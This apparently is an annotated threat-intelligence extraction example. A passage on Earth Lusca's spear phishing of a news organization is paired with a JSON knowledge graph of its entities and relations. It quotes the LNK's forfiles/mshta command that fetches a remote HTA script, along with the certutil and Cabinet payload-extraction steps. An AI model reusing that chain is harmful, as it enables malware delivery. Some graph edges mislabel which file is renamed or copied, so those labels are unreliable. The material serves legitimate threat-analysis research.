


Sentence : Spear Phishing
Through our telemetry data, we observed Earth Lusca sending spear phishing emails containing a
malicious link to a target news organization. The files in the link were presented either as a document that
journalists might be interested in, or as an opinion form sent by another media organization. The
downloaded file is an archive file that contains either a malicious LNK file or an executable file. These
archives were hosted either on compromised web servers or Google Drive repositories.
Figure 3. An example of a malicious archive delivered via spear phishing email
Figure 4. The infection chain of the spear phishing emails
In some cases, the victims receive an executable file or an SFX installer inside the archive delivered via
spear phishing that turns out to be a malicious loader. The analysis of the loader is detailed in the
“Malware Analysis” section.
In other cases where victims received an LNK file inside the archive, the LNK will execute the
file %SYSTEM32%\forfiles.exe and give the command string shown in the following argument:
/m "{name of decoy document}.lnk" /c "cmd /c echo f|xcopy @file %temp%{random name}.tmp&for /r
c:\windows\system32_ %i in (sht.exe) _do %i [URL of HTA file}"
The command will move the LNK file into the %TEMP% folder and run mshta.exe to load the malicious
HTA script from the given URL. The malicious HTA script will then copy certutil.exe to the %APPDATA%
folder and rename it as a different process name — which was chrome.exe in the case we analyzed. The
LNK file will then be appended with a Base64-encoded string at the end.
The HTA script will use the “findstr” command to search for the string “TVNDRgAAA” in the LNK file and
extract the identified Base64-encoded string to another temporary file.
Next, it uses the copied certutil.exe to decode the string to a Cabinet file, after which it uses the “expand”
command to extract the payload from the Cabinet file. The extracted files include a decoy document and
a malware file, which is a Cobalt Strike loader. The HTA file will open the decoy document and launch the
loader in background.
Output : 
{
    "nodes": [
        {"id": 1, "description": "Earth Lusca", "type" : "ACTO"},
        {"id": 2, "description": "spear phishing emails", "type" : "MAIL"},
        {"id": 3, "description": "malicious link", "type" : "URLS"},
        {"id": 4, "description": "target news organization", "type" : "COUN"},
        {"id": 5, "description": "archive file", "type" : "DOCF"},
        {"id": 6, "description": "malicious LNK file", "type" : "EXEF"},
        {"id": 7, "description": "executable file", "type" : "EXEF"},
        {"id": 8, "description": "compromised web servers", "type" : "CCSH"},
        {"id": 9, "description": "Google Drive repositories", "type" : "STOR"},
        {"id": 10, "description": "%SYSTEM32%\\forfiles.exe", "type" : "EXEF"},
        {"id": 11, "description": "%TEMP%", "type" : "SYSP"},
        {"id": 12, "description": "sht.exe", "type" : "EXEF"},
        {"id": 13, "description": "URL of HTA file", "type" : "URLS"},
        {"id": 14, "description": "%APPDATA%", "type" : "SYSP"},
        {"id": 15, "description": "chrome.exe", "type" : "EXEF"},
        {"id": 16, "description": "mshta.exe", "type" : "EXEF"},
        {"id": 17, "description": "HTA script", "type" : "DOCF"},
        {"id": 18, "description": "decoy document", "type" : "DOCF"},
        {"id": 19, "description": "malware file (Cobalt Strike loader)", "type" : "EXEF"}
    ],
    "edges": [
        {"source": 1, "target": 2, "rel_name" : "sends"},
        {"source": 2, "target": 3, "rel_name" : "contains"},
        {"source": 3, "target": 4, "rel_name" : "targets"},
        {"source": 3, "target": 5, "rel_name" : "hosts"},
        {"source": 5, "target": 6, "rel_name" : "contains"},
        {"source": 5, "target": 7, "rel_name" : "contains"},
        {"source": 8, "target": 5, "rel_name" : "hosts"},
        {"source": 9, "target": 5, "rel_name" : "hosts"},
        {"source": 6, "target": 10, "rel_name" : "executes"},
        {"source": 10, "target": 12, "rel_name" : "runs"},
        {"source": 10, "target": 13, "rel_name" : "accesses"},
        {"source": 6, "target": 11, "rel_name" : "moves to"},
        {"source": 7, "target": 14, "rel_name" : "copies to"},
        {"source": 12, "target": 15, "rel_name" : "renames as"},
        {"source": 6, "target": 16, "rel_name" : "executes"},
        {"source": 17, "target": 13, "rel_name" : "downloads from"},
        {"source": 17, "target": 10, "rel_name" : "copies and renames"},
        {"source": 17, "target": 18, "rel_name" : "extracts to"},
        {"source": 17, "target": 19, "rel_name" : "launches"}
    ]
}
